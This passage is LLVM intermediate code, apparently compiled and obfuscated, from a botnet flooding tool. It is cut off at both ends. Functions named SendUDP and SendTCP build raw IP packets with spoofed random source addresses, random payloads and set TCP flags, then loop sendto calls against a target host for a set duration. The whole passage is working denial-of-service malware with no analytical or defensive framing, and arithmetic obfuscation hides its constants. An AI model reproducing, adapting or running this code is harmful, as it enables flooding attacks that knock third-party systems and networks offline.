}

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %6
  %28 = call i32 @rand_cmwc()
  %29 = trunc i32 %28 to i16
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  br label %36

; <label>:31:                                     ; preds = %6
  %32 = load i32, i32* %8, align 4
  %33 = trunc i32 %32 to i16
  %34 = call zeroext i16 @htons(i16 zeroext %33) #10
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %36

; <label>:36:                                     ; preds = %31, %27
  %37 = load i8*, i8** %7, align 8
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %39 = call i32 @getHost(i8* %37, %struct.in_addr* %38)
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %36
  br label %250

; <label>:42:                                     ; preds = %36
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = load i32, i32* %11, align 4
  store i32 %45, i32* %14, align 4
  %46 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %46, i32* %15, align 4
  %47 = load i32, i32* %15, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %42
  br label %250

; <label>:50:                                     ; preds = %42
  store i32 1, i32* %16, align 4
  %51 = load i32, i32* %15, align 4
  %52 = bitcast i32* %16 to i8*
  %53 = call i32 @setsockopt(i32 %51, i32 0, i32 3, i8* %52, i32 4) #5
  %54 = icmp slt i32 %53, 0
  br i1 %54, label %55, label %56

; <label>:55:                                     ; preds = %50
  br label %250

; <label>:56:                                     ; preds = %50
  store i32 50, i32* %17, align 4
  br label %57

; <label>:57:                                     ; preds = %64, %56
  %58 = load i32, i32* %17, align 4
  %59 = sub i32 %58, -1970423281
  %60 = add i32 %59, -1
  %61 = add i32 %60, -1970423281
  %62 = add nsw i32 %58, -1
  store i32 %61, i32* %17, align 4
  %63 = icmp ne i32 %58, 0
  br i1 %63, label %64, label %81

; <label>:64:                                     ; preds = %57
  %65 = call i64 @time(i64* null) #5
  %66 = call i32 @rand_cmwc()
  %67 = zext i32 %66 to i64
  %68 = xor i64 %65, -1
  %69 = and i64 -6954352620819666802, %68
  %70 = xor i64 -6954352620819666802, -1
  %71 = and i64 %65, %70
  %72 = xor i64 %67, -1
  %73 = and i64 %72, -6954352620819666802
  %74 = and i64 %67, %70
  %75 = or i64 %69, %71
  %76 = or i64 %73, %74
  %77 = xor i64 %75, %76
  %78 = xor i64 %65, %67
  %79 = trunc i64 %77 to i32
  call void @srand(i32 %79) #5
  %80 = call i32 @rand() #5
  call void @init_rand(i32 %80)
  br label %57

; <label>:81:                                     ; preds = %57
  %82 = load i32, i32* %12, align 4
  %83 = sub i32 0, %82
  %84 = add i32 32, %83
  %85 = sub nsw i32 32, %82
  %86 = shl i32 1, %84
  %87 = add i32 %86, 187340649
  %88 = sub i32 %87, 1
  %89 = sub i32 %88, 187340649
  %90 = sub nsw i32 %86, 1
  %91 = xor i32 %89, -1
  %92 = and i32 1517749749, %91
  %93 = xor i32 1517749749, -1
  %94 = and i32 %89, %93
  %95 = xor i32 -1, -1
  %96 = and i32 %95, 1517749749
  %97 = and i32 -1, %93
  %98 = or i32 %92, %94
  %99 = or i32 %96, %97
  %100 = xor i32 %98, %99
  %101 = xor i32 %89, -1
  store i32 %100, i32* %18, align 4
  %102 = load i32, i32* %10, align 4
  %103 = sext i32 %102 to i64
  %104 = add i64 28, -8469670855655919857
  %105 = add i64 %104, %103
  %106 = sub i64 %105, -8469670855655919857
  %107 = add i64 28, %103
  %108 = call i8* @llvm.stacksave()
  store i8* %108, i8** %19, align 8
  %109 = alloca i8, i64 %106, align 16
  %110 = bitcast i8* %109 to %struct.iphdr*
  store %struct.iphdr* %110, %struct.iphdr** %20, align 8
  %111 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %112 = bitcast %struct.iphdr* %111 to i8*
  %113 = getelementptr i8, i8* %112, i64 20
  %114 = bitcast i8* %113 to %struct.udphdr*
  store %struct.udphdr* %114, %struct.udphdr** %21, align 8
  %115 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %116 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %117 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %116, i32 0, i32 0
  %118 = load i32, i32* %117, align 4
  %119 = load i32, i32* %18, align 4
  %120 = call i32 @getRandomIP(i32 %119)
  %121 = call i32 @htonl(i32 %120) #10
  %122 = load i32, i32* %10, align 4
  %123 = sext i32 %122 to i64
  %124 = sub i64 0, 8
  %125 = sub i64 0, %123
  %126 = add i64 %124, %125
  %127 = sub i64 0, %126
  %128 = add i64 8, %123
  %129 = trunc i64 %127 to i32
  call void @makeIPPacket(%struct.iphdr* %115, i32 %118, i32 %121, i8 zeroext 17, i32 %129)
  %130 = load i32, i32* %10, align 4
  %131 = sext i32 %130 to i64
  %132 = sub i64 8, -7643574355374394979
  %133 = add i64 %132, %131
  %134 = add i64 %133, -7643574355374394979
  %135 = add i64 8, %131
  %136 = trunc i64 %134 to i16
  %137 = call zeroext i16 @htons(i16 zeroext %136) #10
  %138 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %139 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %138, i32 0, i32 0
  %140 = bitcast %union.anon.1* %139 to %struct.anon.2*
  %141 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %140, i32 0, i32 2
  store i16 %137, i16* %141, align 2
  %142 = call i32 @rand_cmwc()
  %143 = trunc i32 %142 to i16
  %144 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %145 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %144, i32 0, i32 0
  %146 = bitcast %union.anon.1* %145 to %struct.anon.2*
  %147 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %146, i32 0, i32 0
  store i16 %143, i16* %147, align 2
  %148 = load i32, i32* %8, align 4
  %149 = icmp eq i32 %148, 0
  br i1 %149, label %150, label %152

; <label>:150:                                    ; preds = %81
  %151 = call i32 @rand_cmwc()
  br label %157

; <label>:152:                                    ; preds = %81
  %153 = load i32, i32* %8, align 4
  %154 = trunc i32 %153 to i16
  %155 = call zeroext i16 @htons(i16 zeroext %154) #10
  %156 = zext i16 %155 to i32
  br label %157

; <label>:157:                                    ; preds = %152, %150
  %158 = phi i32 [ %151, %150 ], [ %156, %152 ]
  %159 = trunc i32 %158 to i16
  %160 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %161 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %160, i32 0, i32 0
  %162 = bitcast %union.anon.1* %161 to %struct.anon.2*
  %163 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %162, i32 0, i32 1
  store i16 %159, i16* %163, align 2
  %164 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %165 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %164, i32 0, i32 0
  %166 = bitcast %union.anon.1* %165 to %struct.anon.2*
  %167 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %166, i32 0, i32 3
  store i16 0, i16* %167, align 2
  %168 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %169 = bitcast %struct.udphdr* %168 to i8*
  %170 = getelementptr inbounds i8, i8* %169, i64 8
  %171 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %170, i32 %171)
  %172 = bitcast i8* %109 to i16*
  %173 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 2
  %175 = load i16, i16* %174, align 2
  %176 = zext i16 %175 to i32
  %177 = call zeroext i16 @csum(i16* %172, i32 %176)
  %178 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 7
  store i16 %177, i16* %179, align 2
  %180 = call i64 @time(i64* null) #5
  %181 = load i32, i32* %9, align 4
  %182 = sext i32 %181 to i64
  %183 = sub i64 0, %182
  %184 = sub i64 %180, %183
  %185 = add nsw i64 %180, %182
  %186 = trunc i64 %184 to i32
  store i32 %186, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %187

; <label>:187:                                    ; preds = %241, %240, %157
  br label %188

; <label>:188:                                    ; preds = %187
  %189 = load i32, i32* %15, align 4
  %190 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %191 = call i64 @sendto(i32 %189, i8* %109, i64 %106, i32 0, %struct.sockaddr* %190, i32 16)
  %192 = call i32 @rand_cmwc()
  %193 = trunc i32 %192 to i16
  %194 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %195 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %194, i32 0, i32 0
  %196 = bitcast %union.anon.1* %195 to %struct.anon.2*
  %197 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %196, i32 0, i32 0
  store i16 %193, i16* %197, align 2
  %198 = load i32, i32* %8, align 4
  %199 = icmp eq i32 %198, 0
  br i1 %199, label %200, label %202

; <label>:200:                                    ; preds = %188
  %201 = call i32 @rand_cmwc()
  br label %207

; <label>:202:                                    ; preds = %188
  %203 = load i32, i32* %8, align 4
  %204 = trunc i32 %203 to i16
  %205 = call zeroext i16 @htons(i16 zeroext %204) #10
  %206 = zext i16 %205 to i32
  br label %207

; <label>:207:                                    ; preds = %202, %200
  %208 = phi i32 [ %201, %200 ], [ %206, %202 ]
  %209 = trunc i32 %208 to i16
  %210 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %211 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %210, i32 0, i32 0
  %212 = bitcast %union.anon.1* %211 to %struct.anon.2*
  %213 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %212, i32 0, i32 1
  store i16 %209, i16* %213, align 2
  %214 = call i32 @rand_cmwc()
  %215 = trunc i32 %214 to i16
  %216 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 3
  store i16 %215, i16* %217, align 4
  %218 = load i32, i32* %18, align 4
  %219 = call i32 @getRandomIP(i32 %218)
  %220 = call i32 @htonl(i32 %219) #10
  %221 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %221, i32 0, i32 8
  store i32 %220, i32* %222, align 4
  %223 = bitcast i8* %109 to i16*
  %224 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 2
  %226 = load i16, i16* %225, align 2
  %227 = zext i16 %226 to i32
  %228 = call zeroext i16 @csum(i16* %223, i32 %227)
  %229 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i32 0, i32 7
  store i16 %228, i16* %230, align 2
  %231 = load i32, i32* %23, align 4
  %232 = load i32, i32* %14, align 4
  %233 = icmp eq i32 %231, %232
  br i1 %233, label %234, label %241

; <label>:234:                                    ; preds = %207
  %235 = call i64 @time(i64* null) #5
  %236 = load i32, i32* %22, align 4
  %237 = sext i32 %236 to i64
  %238 = icmp sgt i64 %235, %237
  br i1 %238, label %239, label %240

; <label>:239:                                    ; preds = %234
  br label %248

; <label>:240:                                    ; preds = %234
  store i32 0, i32* %23, align 4
  br label %187

; <label>:241:                                    ; preds = %207
  %242 = load i32, i32* %23, align 4
  %243 = sub i32 0, %242
  %244 = sub i32 0, 1
  %245 = add i32 %243, %244
  %246 = sub i32 0, %245
  %247 = add i32 %242, 1
  store i32 %246, i32* %23, align 4
  br label %187

; <label>:248:                                    ; preds = %239
  %249 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %249)
  br label %250

; <label>:250:                                    ; preds = %248, %55, %49, %41
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %536

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %52, label %51

; <label>:51:                                     ; preds = %45
  br label %536

; <label>:52:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %53 = load i32, i32* %17, align 4
  %54 = bitcast i32* %18 to i8*
  %55 = call i32 @setsockopt(i32 %53, i32 0, i32 3, i8* %54, i32 4) #5
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %52
  br label %536

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* %14, align 4
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %58
  store i32 0, i32* %19, align 4
  br label %84

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* %14, align 4
  %64 = sub i32 32, -260925487
  %65 = sub i32 %64, %63
  %66 = add i32 %65, -260925487
  %67 = sub nsw i32 32, %63
  %68 = shl i32 1, %66
  %69 = add i32 %68, 1419549257
  %70 = sub i32 %69, 1
  %71 = sub i32 %70, 1419549257
  %72 = sub nsw i32 %68, 1
  %73 = xor i32 %71, -1
  %74 = and i32 2122081778, %73
  %75 = xor i32 2122081778, -1
  %76 = and i32 %71, %75
  %77 = xor i32 -1, -1
  %78 = and i32 %77, 2122081778
  %79 = and i32 -1, %75
  %80 = or i32 %74, %76
  %81 = or i32 %78, %79
  %82 = xor i32 %80, %81
  %83 = xor i32 %71, -1
  store i32 %82, i32* %19, align 4
  br label %84

; <label>:84:                                     ; preds = %62, %61
  %85 = load i32, i32* %12, align 4
  %86 = sext i32 %85 to i64
  %87 = sub i64 0, 40
  %88 = sub i64 0, %86
  %89 = add i64 %87, %88
  %90 = sub i64 0, %89
  %91 = add i64 40, %86
  %92 = call i8* @llvm.stacksave()
  store i8* %92, i8** %20, align 8
  %93 = alloca i8, i64 %90, align 16
  %94 = bitcast i8* %93 to %struct.iphdr*
  store %struct.iphdr* %94, %struct.iphdr** %21, align 8
  %95 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %96 = bitcast %struct.iphdr* %95 to i8*
  %97 = getelementptr i8, i8* %96, i64 20
  %98 = bitcast i8* %97 to %struct.tcphdr*
  store %struct.tcphdr* %98, %struct.tcphdr** %22, align 8
  %99 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %101 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %100, i32 0, i32 0
  %102 = load i32, i32* %101, align 4
  %103 = load i32, i32* %19, align 4
  %104 = call i32 @getRandomIP(i32 %103)
  %105 = call i32 @htonl(i32 %104) #10
  %106 = load i32, i32* %12, align 4
  %107 = sext i32 %106 to i64
  %108 = sub i64 0, %107
  %109 = sub i64 20, %108
  %110 = add i64 20, %107
  %111 = trunc i64 %109 to i32
  call void @makeIPPacket(%struct.iphdr* %99, i32 %102, i32 %105, i8 zeroext 6, i32 %111)
  %112 = call i32 @rand_cmwc()
  %113 = trunc i32 %112 to i16
  %114 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon* %115 to %struct.anon.0*
  %117 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %116, i32 0, i32 0
  store i16 %113, i16* %117, align 4
  %118 = call i32 @rand_cmwc()
  %119 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %120 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %119, i32 0, i32 0
  %121 = bitcast %union.anon* %120 to %struct.anon.0*
  %122 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %121, i32 0, i32 2
  store i32 %118, i32* %122, align 4
  %123 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %124 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %123, i32 0, i32 0
  %125 = bitcast %union.anon* %124 to %struct.anon.0*
  %126 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %125, i32 0, i32 3
  store i32 0, i32* %126, align 4
  %127 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %128 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon* %128 to %struct.anon.0*
  %130 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %129, i32 0, i32 4
  %131 = load i16, i16* %130, align 4
  %132 = xor i16 %131, -1
  %133 = xor i16 -241, -1
  %134 = xor i16 -1419, -1
  %135 = or i16 %132, %133
  %136 = or i16 -1419, %134
  %137 = xor i16 %135, -1
  %138 = and i16 %137, %136
  %139 = and i16 %131, -241
  %140 = xor i16 %138, -1
  %141 = xor i16 80, -1
  %142 = xor i16 -23806, -1
  %143 = and i16 %140, -23806
  %144 = and i16 %138, %142
  %145 = and i16 %141, -23806
  %146 = and i16 80, %142
  %147 = or i16 %143, %144
  %148 = or i16 %145, %146
  %149 = xor i16 %147, %148
  %150 = or i16 %140, %141
  %151 = xor i16 %150, -1
  %152 = or i16 -23806, %142
  %153 = and i16 %151, %152
  %154 = or i16 %149, %153
  %155 = or i16 %138, 80
  store i16 %154, i16* %130, align 4
  %156 = load i8*, i8** %11, align 8
  %157 = call i32 @strcmp(i8* %156, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.538, i32 0, i32 0)) #9
  %158 = icmp ne i32 %157, 0
  br i1 %158, label %281, label %159

; <label>:159:                                    ; preds = %84
  %160 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %161 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %160, i32 0, i32 0
  %162 = bitcast %union.anon* %161 to %struct.anon.0*
  %163 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %162, i32 0, i32 4
  %164 = load i16, i16* %163, align 4
  %165 = xor i16 %164, -1
  %166 = xor i16 -513, -1
  %167 = xor i16 8757, -1
  %168 = or i16 %165, %166
  %169 = or i16 8757, %167
  %170 = xor i16 %168, -1
  %171 = and i16 %170, %169
  %172 = and i16 %164, -513
  %173 = and i16 %171, 512
  %174 = xor i16 %171, 512
  %175 = or i16 %173, %174
  %176 = or i16 %171, 512
  store i16 %175, i16* %163, align 4
  %177 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %178 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %177, i32 0, i32 0
  %179 = bitcast %union.anon* %178 to %struct.anon.0*
  %180 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %179, i32 0, i32 4
  %181 = load i16, i16* %180, align 4
  %182 = xor i16 %181, -1
  %183 = xor i16 -1025, -1
  %184 = xor i16 -12941, -1
  %185 = or i16 %182, %183
  %186 = or i16 -12941, %184
  %187 = xor i16 %185, -1
  %188 = and i16 %187, %186
  %189 = and i16 %181, -1025
  %190 = and i16 %188, 1024
  %191 = xor i16 %188, 1024
  %192 = or i16 %190, %191
  %193 = or i16 %188, 1024
  store i16 %192, i16* %180, align 4
  %194 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 0
  %196 = bitcast %union.anon* %195 to %struct.anon.0*
  %197 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %196, i32 0, i32 4
  %198 = load i16, i16* %197, align 4
  %199 = xor i16 %198, -1
  %200 = xor i16 -257, -1
  %201 = xor i16 -2660, -1
  %202 = or i16 %199, %200
  %203 = or i16 -2660, %201
  %204 = xor i16 %202, -1
  %205 = and i16 %204, %203
  %206 = and i16 %198, -257
  %207 = xor i16 %205, -1
  %208 = xor i16 256, -1
  %209 = xor i16 9586, -1
  %210 = and i16 %207, 9586
  %211 = and i16 %205, %209
  %212 = and i16 %208, 9586
  %213 = and i16 256, %209
  %214 = or i16 %210, %211
  %215 = or i16 %212, %213
  %216 = xor i16 %214, %215
  %217 = or i16 %207, %208
  %218 = xor i16 %217, -1
  %219 = or i16 9586, %209
  %220 = and i16 %218, %219
  %221 = or i16 %216, %220
  %222 = or i16 %205, 256
  store i16 %221, i16* %197, align 4
  %223 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %224 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %223, i32 0, i32 0
  %225 = bitcast %union.anon* %224 to %struct.anon.0*
  %226 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %225, i32 0, i32 4
  %227 = load i16, i16* %226, align 4
  %228 = xor i16 %227, -1
  %229 = xor i16 -4097, -1
  %230 = xor i16 -20257, -1
  %231 = or i16 %228, %229
  %232 = or i16 -20257, %230
  %233 = xor i16 %231, -1
  %234 = and i16 %233, %232
  %235 = and i16 %227, -4097
  %236 = xor i16 %234, -1
  %237 = xor i16 4096, -1
  %238 = xor i16 25944, -1
  %239 = and i16 %236, 25944
  %240 = and i16 %234, %238
  %241 = and i16 %237, 25944
  %242 = and i16 4096, %238
  %243 = or i16 %239, %240
  %244 = or i16 %241, %242
  %245 = xor i16 %243, %244
  %246 = or i16 %236, %237
  %247 = xor i16 %246, -1
  %248 = or i16 25944, %238
  %249 = and i16 %247, %248
  %250 = or i16 %245, %249
  %251 = or i16 %234, 4096
  store i16 %250, i16* %226, align 4
  %252 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 0
  %254 = bitcast %union.anon* %253 to %struct.anon.0*
  %255 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %254, i32 0, i32 4
  %256 = load i16, i16* %255, align 4
  %257 = xor i16 %256, -1
  %258 = xor i16 -2049, -1
  %259 = xor i16 -18669, -1
  %260 = or i16 %257, %258
  %261 = or i16 -18669, %259
  %262 = xor i16 %260, -1
  %263 = and i16 %262, %261
  %264 = and i16 %256, -2049
  %265 = xor i16 %263, -1
  %266 = xor i16 2048, -1
  %267 = xor i16 22160, -1
  %268 = and i16 %265, 22160
  %269 = and i16 %263, %267
  %270 = and i16 %266, 22160
  %271 = and i16 2048, %267
  %272 = or i16 %268, %269
  %273 = or i16 %270, %271
  %274 = xor i16 %272, %273
  %275 = or i16 %265, %266
  %276 = xor i16 %275, -1
  %277 = or i16 22160, %267
  %278 = and i16 %276, %277
  %279 = or i16 %274, %278
  %280 = or i16 %263, 2048
  store i16 %279, i16* %255, align 4
  br label %421

; <label>:281:                                    ; preds = %84
  %282 = load i8*, i8** %11, align 8
  %283 = call i8* @strtok(i8* %282, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.539, i32 0, i32 0)) #5
  store i8* %283, i8** %23, align 8
  br label %284

; <label>:284:                                    ; preds = %418, %281
  %285 = load i8*, i8** %23, align 8
  %286 = icmp ne i8* %285, null
  br i1 %286, label %287, label %420

; <label>:287:                                    ; preds = %284
  %288 = load i8*, i8** %23, align 8
  %289 = call i32 @strcmp(i8* %288, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.540, i32 0, i32 0)) #9
  %290 = icmp ne i32 %289, 0
  br i1 %290, label %309, label %291

; <label>:291:                                    ; preds = %287
  %292 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %293 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %292, i32 0, i32 0
  %294 = bitcast %union.anon* %293 to %struct.anon.0*
  %295 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %294, i32 0, i32 4
  %296 = load i16, i16* %295, align 4
  %297 = xor i16 %296, -1
  %298 = xor i16 -513, -1
  %299 = xor i16 30692, -1
  %300 = or i16 %297, %298
  %301 = or i16 30692, %299
  %302 = xor i16 %300, -1
  %303 = and i16 %302, %301
  %304 = and i16 %296, -513
  %305 = and i16 %303, 512
  %306 = xor i16 %303, 512
  %307 = or i16 %305, %306
  %308 = or i16 %303, 512
  store i16 %307, i16* %295, align 4
  br label %418

; <label>:309:                                    ; preds = %287
  %310 = load i8*, i8** %23, align 8
  %311 = call i32 @strcmp(i8* %310, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.541, i32 0, i32 0)) #9
  %312 = icmp ne i32 %311, 0
  br i1 %312, label %343, label %313

; <label>:313:                                    ; preds = %309
  %314 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon* %315 to %struct.anon.0*
  %317 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %316, i32 0, i32 4
  %318 = load i16, i16* %317, align 4
  %319 = xor i16 %318, -1
  %320 = xor i16 -1025, -1
  %321 = xor i16 15002, -1
  %322 = or i16 %319, %320
  %323 = or i16 15002, %321
  %324 = xor i16 %322, -1
  %325 = and i16 %324, %323
  %326 = and i16 %318, -1025
  %327 = xor i16 %325, -1
  %328 = xor i16 1024, -1
  %329 = xor i16 -6800, -1
  %330 = and i16 %327, -6800
  %331 = and i16 %325, %329
  %332 = and i16 %328, -6800
  %333 = and i16 1024, %329
  %334 = or i16 %330, %331
  %335 = or i16 %332, %333
  %336 = xor i16 %334, %335
  %337 = or i16 %327, %328
  %338 = xor i16 %337, -1
